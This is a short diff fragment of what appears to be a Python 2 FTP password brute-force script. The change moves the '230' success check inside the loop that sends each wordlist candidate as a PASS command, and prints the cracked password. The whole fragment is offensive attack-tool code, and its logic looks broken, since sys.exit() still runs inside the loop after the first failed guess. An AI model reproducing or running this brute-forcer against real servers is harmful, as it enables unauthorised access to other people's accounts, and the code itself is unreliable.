@@ -33,10 +33,10 @@ def brute():
 		s.send("PASS "+line+"\r\n")
 		result = s.recv(1024)
 		s.send("QUIT\r\n")
-	if re.search("230", result):
-		print "[+] Got the FTP password: %s [+]"%(result)
-		return
-	else:
-		print "[-] You couldn't crack this shit [-]\n"
-	sys.exit()
+		if re.search("230", result):
+			print "[+] Got the FTP password: %s [+]"%(line)
+			break
+		else:
+			print "[-] You couldn't crack this shit [-]\n"
+		sys.exit()
 main()
